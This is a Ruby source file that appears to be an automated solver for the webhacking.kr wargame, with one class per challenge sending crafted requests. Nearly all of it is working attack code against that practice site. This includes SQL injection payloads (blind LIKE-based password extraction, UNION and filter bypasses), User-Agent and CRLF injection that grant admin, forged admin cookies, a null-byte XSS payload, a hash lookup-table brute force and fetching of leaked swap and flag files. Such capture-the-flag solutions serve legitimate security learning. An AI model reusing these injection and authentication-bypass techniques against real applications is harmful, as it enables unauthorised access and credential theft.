# frozen_string_literal: true

require 'digest'
require 'base64'
require 'resolv'
require 'docx'

module WebhackingKR
  ##
  # Challenge base
  class ChallengeBase
    DATA_DIR = File.join(__dir__, '..', '..', 'data')

    OPENDNS_RESOLVER = 'resolver1.opendns.com'
    OPENDNS_MYIP = 'myip.opendns.com'

    @@successors = []

    class << self
      def inherited(subclass)
        super
        @@successors << subclass
      end

      def successors
        @@successors
      end
    end

    def initialize(shell, wargame, client)
      @shell = shell
      @wargame = wargame
      @client = client

      Dir.mkdir(data_dir) unless Dir.exist?(data_dir)
    end

    def exec; end

    ##
    # Prints a message
    def log(message)
      @shell.log("[challenge#{self.class::CHALLENGE}] #{message}")
    end

    def pwned
      log('Pwned!')
    end

    def failed(message = 'Failed!')
      log(message)
      false
    end

    def solved
      log('Already solved!')
    end

    ##
    # Checks if the challenge has been done
    def check(data)
      n = format('%02d', self.class::CHALLENGE)

      if data =~ /old-#{n} Pwned/
        pwned
        return true
      end

      if data =~ /already solved/
        solved
        return true
      end

      failed
    end

    ##
    # Returns the data directory
    def data_dir
      File.join(DATA_DIR, "challenge#{self.class::CHALLENGE}")
    end

    ##
    # Starts HTTP connection
    def http_start
      @client.start { yield if block_given? }
    end

    ##
    # Sends HTTP GET request
    def get(query, headers = {})
      headers['Cookie'] = join_cookie(headers['Cookie'])
      request = Net::HTTP::Get.new(query, headers)
      begin
        @client.request(request)
      rescue StandardError => e
        raise HTTPError, e
      end
    end

    ##
    # Sends HTTP POST request
    def post(query, data = {}, headers = {})
      headers['Cookie'] = join_cookie(headers['Cookie'])
      request = Net::HTTP::Post.new(query, headers)
      request.set_form_data(data)
      begin
        @client.request(request)
      rescue StandardError => e
        raise HTTPError, e
      end
    end

    ##
    # Authenticates the flag
    def auth(flag)
      response = post(
        Wargame::QUERY_AUTH,
        { 'flag' => flag }
      )
      response.body
    end

    private

    ##
    # Prepends PHPSESSID to cookie
    def join_cookie(cookie)
      data = ["PHPSESSID=#{@wargame.session_id}"]
      data << cookie if cookie
      data.join('; ')
    end

    ##
    # Determines your own IP address
    def myip
      resolver = Resolv::DNS.new(nameserver: OPENDNS_RESOLVER)
      resolver.getaddress(OPENDNS_MYIP).to_s
    end
  end

  ##
  # Challenge 1
  class Challenge1 < ChallengeBase
    CHALLENGE = 1

    PATH = '/challenge/web-01/'

    def exec
      log('Sending cookie')
      response = get(
        PATH,
        { 'Cookie' => 'user_lv=3.5' }
      )
      check(response.body)
    end
  end

  ##
  # Challenge 3
  class Challenge3 < ChallengeBase
    CHALLENGE = 3

    PATH = '/challenge/web-03/'
    PAYLOAD = "' OR 1=1 #"

    def exec
      log('Submitting answer')
      response = post(
        PATH,
        {
          'answer' => PAYLOAD,
          'id' => @wargame.user_id
        }
      )
      check(response.body)
    end
  end

  ##
  # Challenge 4
  class Challenge4 < ChallengeBase
    CHALLENGE = 4

    PATH = '/challenge/web-04/'
    SALT = 'salt_for_you'
    FROM = 10_000_000
    TO = 99_999_999
    INTERVAL = 300_000
    ROUNDS = 500
    TABLE_FILE = 'table.dat'
    HASH_LENGTH = 20

    def exec
      table_file = File.join(data_dir, TABLE_FILE)
      File.open(table_file, 'w').close unless File.exist?(table_file)
      table_size = File.size(table_file)
      table_size /= HASH_LENGTH
      file = File.open(table_file, 'r+b')
      file.seek(table_size * HASH_LENGTH)
      key = nil
      log("Lookup table: #{table_size} hashes")
      log('Generating lookup table and getting hashes')
      i = FROM + table_size
      loop do
        if (!i.zero? && (i % INTERVAL).zero?) || i >= TO
          file.rewind
          response = get(PATH)
          match = %r(><b>([a-z0-9]{#{HASH_LENGTH * 2}})</b></td>).match(response.body)
          unless match
            failed
            break
          end
          @hash = match[1]
          log(@hash)
          @hash = [@hash].pack('H*')

          n = nil
          until file.eof?
            h = file.read(HASH_LENGTH)
            next unless h == @hash

            n = (file.pos - HASH_LENGTH) / HASH_LENGTH
            break
          end

          if n
            key = "#{n + FROM}#{SALT}"
            break
          end
        end

        h = "#{i}#{SALT}"
        file.write(hash(h))

        i += 1
        break if i > TO
      rescue Interrupt
        file.close
        return
      end

      file.close
      unless key
        failed('Key not found')
        return
      end

      log("Key found: #{key}")
      log('Submitting key')
      response = post(
        PATH,
        { 'key' => key }
      )
      check(response.body)
    end

    private

    def hash(key)
      ROUNDS.times { key = Digest::SHA1.hexdigest(key) }
      [key].pack('H*')
    end
  end

  ##
  # Challenge 5
  class Challenge5 < ChallengeBase
    CHALLENGE = 5

    PATH = '/challenge/web-05/'
    PATH_LOGIN = "#{PATH}mem/login.php"
    PATH_JOIN = "#{PATH}mem/join.php"
    LOGIN = ' admin'
    PASSWORD = 'pw'

    def exec
      log("Registering the user '#{LOGIN}'")
      post(
        PATH_JOIN,
        {
          'id' => LOGIN,
          'pw' => PASSWORD
        }
      )

      log('Logging in')
      response = post(
        PATH_LOGIN,
        {
          'id' => LOGIN,
          'pw' => PASSWORD
        }
      )
      check(response.body)
    end
  end

  ##
  # Challenge 6
  class Challenge6 < ChallengeBase
    CHALLENGE = 6

    PATH = '/challenge/web-06/'
    USER = 'admin'
    PASSWORD = 'nimda'
    ROUNDS = 20

    def exec
      user = encode(USER)
      password = encode(PASSWORD)
      log('Sending cookie')
      response = get(
        PATH,
        { 'Cookie' => "user=#{user}; password=#{password}" }
      )
      check(response.body)
    end

    private

    def encode(data)
      ROUNDS.times { data = Base64.strict_encode64(data) }
      data.tr('12345678', '!@$^&*()')
    end

    def decode(data)
      ROUNDS.times { data = Base64.strict_decode64(data) }
      data.tr('!@$^&*()', '12345678')
    end
  end

  ##
  # Challenge 7
  class Challenge7 < ChallengeBase
    CHALLENGE = 7

    PATH = '/challenge/web-07/'
    QUERY = '?val='
    PAYLOAD = 'SELECT(3))UNION(SELECT(SUBSTR(HEX(34),1,1)))#'

    def exec
      log('Trying send payload')
      loop do
        payload = URI.encode_www_form_component(PAYLOAD)
        response = get("#{PATH}#{QUERY}#{payload}")
        next if response.body =~ /nice try!/

        check(response.body)
        break
      end
    end
  end

  ##
  # Challenge 8
  class Challenge8 < ChallengeBase
    CHALLENGE = 8

    PATH = '/challenge/web-08/'
    USER_AGENT = 'agentx'
    PAYLOAD = "', '', 'admin') #"

    def exec
      log('Sending payload')
      get(
        PATH,
        { 'User-Agent' => "#{USER_AGENT}#{PAYLOAD}" }
      )

      log('Getting page')
      response = get(
        PATH,
        { 'User-Agent' => USER_AGENT }
      )
      check(response.body)
    end
  end

  ##
  # Challenge 10
  class Challenge10 < ChallengeBase
    CHALLENGE = 10

    PATH = '/challenge/code-1/'
    QUERY = '?go='
    PIXEL = '1600px'

    def exec
      response = get(
        "#{PATH}#{QUERY}#{PIXEL}",
        { 'Referer' => "#{Wargame::BASE_URI}#{PATH}" }
      )
      check(response.body)
    end
  end

  ##
  # Challenge 11
  class Challenge11 < ChallengeBase
    CHALLENGE = 11

    PATH = '/challenge/code-2/'
    QUERY = '?val='

    def exec
      log('Determining your own IP address')
      ip = myip
      log("IP: #{ip}")
      val = "1abcde_#{ip}\tp\ta\ts\ts"
      val = URI.encode_www_form_component(val)
      log("Sending value: #{val}")
      response = get("#{PATH}#{QUERY}#{val}")
      check(response.body)
    end
  end

  ##
  # Challenge 14
  class Challenge14 < ChallengeBase
    CHALLENGE = 14

    PATH = '/challenge/js-1/'

    def exec
      url = "#{Wargame::BASE_URI}#{PATH}"
      ul = url.index('.kr')
      ul *= 30
      log('Getting page')
      response = get("#{PATH}?#{ul**2}")
      check(response.body)
    end
  end

  ##
  # Challenge 15
  class Challenge15 < ChallengeBase
    CHALLENGE = 15

    PATH = '/challenge/js-2/'
    QUERY = '?getFlag'

    def exec
      response = get("#{PATH}#{QUERY}")
      check(response.body)
    end
  end

  ##
  # Challenge 16
  class Challenge16 < ChallengeBase
    CHALLENGE = 16

    PATH = '/challenge/js-3/'
    TARGET = "#{124.chr}.php"

    def exec
      response = get("#{PATH}#{TARGET}")
      check(response.body)
    end
  end

  ##
  # Challenge 17
  class Challenge17 < ChallengeBase
    CHALLENGE = 17

    PATH = '/challenge/js-4/'
    UNLOCK = 780_929.71

    def exec
      response = get("#{PATH}?#{UNLOCK}")
      check(response.body)
    end
  end

  ##
  # Challenge 18
  class Challenge18 < ChallengeBase
    CHALLENGE = 18

    PATH = '/challenge/web-32/'
    QUERY = '?no='
    PAYLOAD = "''OR`id`='admin'"

    def exec
      payload = URI.encode_www_form_component(PAYLOAD)
      response = get("#{PATH}#{QUERY}#{payload}")
      check(response.body)
    end
  end

  ##
  # Challenge 19
  class Challenge19 < ChallengeBase
    CHALLENGE = 19

    PATH = '/challenge/js-6/'
    LOGIN = 'admin'

    def exec
      userid = Base64.strict_encode64(encode(LOGIN))
      log('Sending cookie')
      response = get(
        PATH,
        { 'Cookie' => "userid=#{userid}" }
      )
      check(response.body)
    end

    private

    def encode(login)
      login.chars.map { |c| Digest::MD5.hexdigest(c) }.join
    end
  end

  ##
  # Challenge 20
  class Challenge20 < ChallengeBase
    CHALLENGE = 20

    PATH = '/challenge/code-4/'

    def exec
      http_start do
        log('Getting page')
        response = get(PATH)
        match = /name=captcha_ value="([a-zA-Z0-9]{10})"/.match(response.body)
        unless match
          failed
          return
        end

        cookie = response['Set-Cookie'].split('; ')
        st = 0
        cookie.each do |c|
          w = c.split('=')
          next unless w[0] == 'st'

          st = w[1].to_i
          break
        end

        log("Server time: #{st}")
        log("Sending CAPTCHA: #{match[1]}")
        response = post(
          PATH,
          {
            'id' => 'tester',
            'cmt' => 'comment',
            'captcha' => match[1]
          },
          { 'Cookie' => "st=#{st}" }
        )
        check(response.body)
      end
    end
  end

  ##
  # Challenge 21
  class Challenge21 < ChallengeBase
    CHALLENGE = 21

    PATH = '/challenge/bonus-1/'
    PARAM_ID = 'id'
    PARAM_PW = 'pw'
    LOGIN = 'admin'
    PAYLOAD = "' OR (`id` = '#{LOGIN}' AND `pw` LIKE BINARY '$PW$') #"
    ALPHABET =
      ('a'..'z').to_a +
      ('A'..'Z').to_a +
      (0..9).to_a +
      ['_', '-']

    def exec
      password = String.new
      search = true
      log('Searching password')
      while search
        ALPHABET.each_with_index do |char, i|
          payload = PAYLOAD.sub('$PW$', "#{password}#{char}%")
          query = URI.encode_www_form(
            PARAM_ID => 'id',
            PARAM_PW => payload
          )

          response = get("#{PATH}?#{query}")
          unless response.body =~ /wrong password/
            if i == ALPHABET.length - 1
              search = false
              break
            end
            next
          end

          password << char
          log(password)
          break
        end
      end

      if password.empty?
        failed('Password not found')
        return
      end

      log("Password found: #{password}")
      log('Logging in')
      query = URI.encode_www_form(
        PARAM_ID => LOGIN,
        PARAM_PW => password
      )
      response = get("#{PATH}?#{query}")
      check(response.body)
    end
  end

  ##
  # Challenge 23
  class Challenge23 < ChallengeBase
    CHALLENGE = 23

    PATH = '/challenge/bonus-3/'
    PARAM_QUERY = 'code'
    PAYLOAD = '<script>alert(1);</script>'

    def exec
      payload = String.new
      PAYLOAD.each_char { |char| payload << "#{char}\x00" }
      query = URI.encode_www_form(PARAM_QUERY => payload)
      log('Sending payload')
      response = get("#{PATH}?#{query}")
      check(response.body)
    end
  end

  ##
  # Challenge 24
  class Challenge24 < ChallengeBase
    CHALLENGE = 24

    PATH = '/challenge/bonus-4/'
    PAYLOAD = 'REMOTE_ADDR=10.270...00...00...1'

    def exec
      log('Sending payload')
      response = get(
        PATH,
        { 'Cookie' => PAYLOAD }
      )
      check(response.body)
    end
  end

  ##
  # Challenge 26
  class Challenge26 < ChallengeBase
    CHALLENGE = 26

    PATH = '/challenge/web-11/'
    PARAM_ID = 'id'
    LOGIN = 'admin'

    def exec
      payload = String.new
      LOGIN.each_char { |char| payload << "%#{char.ord.to_s(16)}" }
      query = URI.encode_www_form(PARAM_ID => payload)
      log('Sending payload')
      response = get("#{PATH}?#{query}")
      check(response.body)
    end
  end

  ##
  # Challenge 27
  class Challenge27 < ChallengeBase
    CHALLENGE = 27

    PATH = '/challenge/web-12/'
    PARAM_NO = 'no'
    PAYLOAD = "2)OR`no`>'1'--\t"

    def exec
      query = URI.encode_www_form(PARAM_NO => PAYLOAD)
      response = get("#{PATH}?#{query}")
      check(response.body)
    end
  end

  ##
  # Challenge 32
  class Challenge32 < ChallengeBase
    CHALLENGE = 32

    PATH = '/challenge/code-5/'
    QUERY = '?hit='
    AMOUNT = 100

    def exec
      log("Hitting page #{AMOUNT} times")
      AMOUNT.times { get("#{PATH}#{QUERY}#{@wargame.user_id}") }
      response = get(PATH)
      check(response.body)
    end
  end

  ##
  # Challenge 36
  class Challenge36 < ChallengeBase
    CHALLENGE = 36

    PATH = '/challenge/bonus-8/'
    FILE = '.index.php.swp'

    def exec
      log('Getting file')
      response = get("#{PATH}#{FILE}")
      match = /(FLAG\{.*\})/.match(response.body)
      unless match
        failed
        return
      end

      log(match[1])
      check(auth(match[1]))
    end
  end

  ##
  # Challenge 38
  class Challenge38 < ChallengeBase
    CHALLENGE = 38

    PATH = '/challenge/bonus-9/'
    PATH_ADMIN = "#{PATH}admin.php"
    PARAM_ID = 'id'
    PAYLOAD = "tester\r\n$IP$:admin"

    def exec
      log('Determining your own IP address')
      ip = myip
      log("IP: #{ip}")
      payload = PAYLOAD.sub('$IP$', ip)
      log('Sending payload')
      post(
        PATH,
        { PARAM_ID => payload }
      )

      log('Getting admin page')
      response = get(PATH_ADMIN)
      check(response.body)
    end
  end

  ##
  # Challenge 42
  class Challenge42 < ChallengeBase
    CHALLENGE = 42

    PATH = '/challenge/web-20/'
    PARAM_DOWN = 'down'
    FILE = 'flag.docx'

    def exec
      file = Base64.strict_encode64(FILE)
      query = URI.encode_www_form(PARAM_DOWN => file)
      log("Getting file #{FILE}")
      response = get("#{PATH}?#{query}")
      doc = Docx::Document.open(response.body)
      match = /(FLAG\{.*\})/.match(doc.paragraphs[0].to_s)
      unless match
        failed
        return
      end

      log(match[1])
      check(auth(match[1]))
    end
  end

  ##
  # Challenge 46
  class Challenge46 < ChallengeBase
    CHALLENGE = 46

    PATH = '/challenge/web-23/'
    PARAM_LV = 'lv'
    LOGIN = 'admin'
    PAYLOAD = '(0)OR`id`=0b$BIN$'

    def exec
      payload = PAYLOAD.sub('$BIN$', LOGIN.unpack1('B*'))
      query = URI.encode_www_form(PARAM_LV => payload)
      log('Sending payload')
      response = get("#{PATH}?#{query}")
      check(response.body)
    end
  end

  ##
  # Challenge 54
  class Challenge54 < ChallengeBase
    CHALLENGE = 54

    PATH = '/challenge/bonus-14/'
    QUERY = '?m='

    def exec
      i = 0
      password = String.new
      log('Getting password')
      loop do
        response = get(
          "#{PATH}#{QUERY}#{i}",
          { 'Referer' => "#{Wargame::BASE_URI}#{PATH}" }
        )
        break if response.body.empty?

        log(response.body)
        password << response.body
        i += 1
      end

      log("Password: #{password}")
      check(auth(password))
    end
  end

  ##
  # Challenge 59
  class Challenge59 < ChallengeBase
    CHALLENGE = 59

    PATH = '/challenge/web-36/'
    PARAM_ID = 'id'
    PARAM_PHONE = 'phone'
    PARAM_LID = 'lid'
    PARAM_LPHONE = 'lphone'
    ID = 'nimda'
    PHONE = 1
    PAYLOAD = "#{PHONE},REVERSE(`id`))-- "

    def exec
      log('Registering the ID')
      post(
        PATH,
        {
          PARAM_ID => ID,
          PARAM_PHONE => PAYLOAD
        }
      )

      log('Logging in')
      response = post(
        PATH,
        {
          PARAM_LID => ID,
          PARAM_LPHONE => PHONE
        }
      )
      check(response.body)
    end
  end

  ##
  # Challenge 61
  class Challenge61 < ChallengeBase
    CHALLENGE = 61

    PATH = '/challenge/web-38/'
    PARAM_ID = 'id'
    PAYLOAD = '0x61646d696e id'

    def exec
      query = URI.encode_www_form(PARAM_ID => PAYLOAD)
      log('Sending payload')
      response = get("#{PATH}?#{query}")
      check(response.body)
    end
  end
end
